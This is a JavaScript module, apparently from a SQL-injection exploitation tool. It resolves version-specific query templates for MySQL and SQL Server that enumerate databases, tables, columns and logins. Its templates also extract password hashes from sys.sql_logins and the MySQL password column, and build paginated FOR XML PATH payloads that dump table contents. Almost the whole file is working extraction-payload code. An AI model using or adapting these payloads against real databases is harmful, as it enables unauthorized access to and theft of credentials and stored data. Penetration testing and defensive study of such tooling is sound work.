// =====================================================================
// sysQueriesVersioned.js — 按版本解析 SYS_QUERIES 视图（resolveSysQueries）
// 自 extractionMaps.js 拆出（纯搬移）：MySQL <5.7 密码列回退 + SQL Server <2017
// FOR XML PATH 全量降级（含 <2012 分页处理）。
// =====================================================================
import { escBracket, escSql } from '../DialectSqlBuilder.js';
import { versionAtLeast } from '../dbmsVersion.js';
import { SYS_QUERIES } from './sysQueries.js';

// ============================================================================
// [P2-2] 版本分支解析：resolveSysQueries(dbms, version)
//
// 背景：指纹阶段已把版本解析进 ctx.dbmsVersion（{major,minor,raw}|null），但 SYS_QUERIES
// 各方言模板是静态的，未按版本分支。真实兼容问题：
//   · MySQL <5.7：mysql.user 无 authentication_string 列（引用即 Unknown column）
//     —— 5.7+ 反向同理（password 列已删除）；旧 IFNULL(a,b) 双列写法任何版本都报错
//   · SQL Server <2017：无 STRING_AGG/CONCAT_WS（2012-2016 会直接语法错误）
//   · SQL Server <2012：无 OFFSET/FETCH 分页、无 CONCAT（2008/2008R2 全废）
// 版本未知（null/major=null）→ 返回原 SYS_QUERIES 条目（保守按新版本处理，不做降级）。
// 返回值是「同构视图」：字段集与 SYS_QUERIES 完全一致，调用方零改动。
// ============================================================================

// SQL Server <2017 通用行拼接表达式：ISNULL(CAST(col AS nvarchar(max)),'') 用 CHAR(31) 连接。
// （CONCAT/CONCAT_WS 在 2012 之前不存在，`+` 遇 NULL 得 NULL，必须 ISNULL 兜底）
function mssqlLegacyRowExpr(cols) {
  const list = Array.isArray(cols) && cols.length
    ? cols
    : []; // 无列名 → 退化为 '*' 场景由调用方保证不发生（dumpData 前置猜列）
  return list
    .map((c) => `ISNULL(CAST([${String(c).replace(/[[\]]/g, '')}] AS nvarchar(max)),'')`)
    .join('+CHAR(31)+');
}

// SQL Server <2017 聚合：FOR XML PATH('') + TYPE 指令（2005+ 可用），替代 STRING_AGG。
// 行结构对齐现代路径（string_agg(CONCAT_WS(CHAR(31),...), CHAR(30))）：
//   每行 = CHAR(30) + 单元格(CHAR(31) 连接) → STUFF 掐头 1 字符去掉首行前导行分隔符。
// 分页用 ROW_NUMBER 窗口函数（2005+ 通用，2012+ 亦兼容），替代 OFFSET/FETCH（2012+ 才有）。
/**
 * SQL Server <2017 聚合路径（FOR XML PATH + ROW_NUMBER 分页）。
 * @param {string} db
@param {string} table
@param {string[]} cols
 * @param {number} limit
@param {number} [offset]
@param {string|null} [where]
 * @returns {string}
 */
function mssqlLegacyData(db, table, cols, limit, offset = 0, where = null) {
  const w = where ? ` WHERE ${where}` : '';
  const rowExpr = mssqlLegacyRowExpr(cols);
  const cellExpr = rowExpr || `CAST('*' AS nvarchar(max))`;
  const inner = `SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) AS __rn, ${cellExpr} AS __row FROM [${escBracket(table)}]${w}`;
  return `SELECT STUFF((SELECT CHAR(30)+CAST(__row AS nvarchar(max)) FROM (SELECT * FROM (${inner}) p WHERE p.__rn > ${offset} AND p.__rn <= ${offset + limit}) x FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')`;
}

// SQL Server 旧版条目：标量聚合（库/表/列/凭据）+ 分页数据提取
const SYS_QUERIES_MSSQL_LEGACY = {
  databases: "SELECT STUFF((SELECT ','+CAST(name AS nvarchar(max)) FROM sys.databases FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
  tables: () =>
    "SELECT STUFF((SELECT ','+CAST(table_name AS nvarchar(max)) FROM information_schema.tables FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
  /** @type {(db: string, table: string) => string} */
  columns: (db, table) =>
    `SELECT STUFF((SELECT ','+CAST(column_name AS nvarchar(max)) FROM information_schema.columns WHERE table_name='${escSql(table)}' FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')`,
  users: "SELECT STUFF((SELECT ','+CAST(name AS nvarchar(max)) FROM sys.sql_logins FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
  passwords: "SELECT STUFF((SELECT ','+CAST(name+':'+master.dbo.fn_varbintohexstr(password_hash) AS nvarchar(max)) FROM sys.sql_logins FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
  data: (db, table, cols, limit, offset = 0, where = null) =>
    mssqlLegacyData(db, table, cols, limit, offset, where),
};

/**
 * 按版本解析 SYS_QUERIES 视图（同构字段，调用方零改动）。
 * @param {string} dbms 归一化 DBMS 名（resolveDbms 之后）
 * @param {{major:number|null, minor:number|null, raw?:string}|null} [version] 指纹阶段解析的版本
 * @returns {object} SYS_QUERIES[dbms] 原条目 或 版本降级变体
 */
export function resolveSysQueries(dbms, version) {
  const base = SYS_QUERIES[dbms];
  if (!base || !version || version.major == null) return base;
  if (dbms === 'MySQL') {
    // <5.7：authentication_string 列不存在 → 回退 password 列
    if (!versionAtLeast(version, 5.7) && base.passwordsLegacy) {
      return { ...base, passwords: base.passwordsLegacy };
    }
    return base;
  }
  if (dbms === 'SQL Server') {
    // <2017：无 STRING_AGG/CONCAT_WS → FOR XML PATH 全量降级（数据路径内含 <2012 分页处理）
    if (!versionAtLeast(version, 2017)) {
      return { ...base, ...SYS_QUERIES_MSSQL_LEGACY };
    }
    return base;
  }
  return base;
}

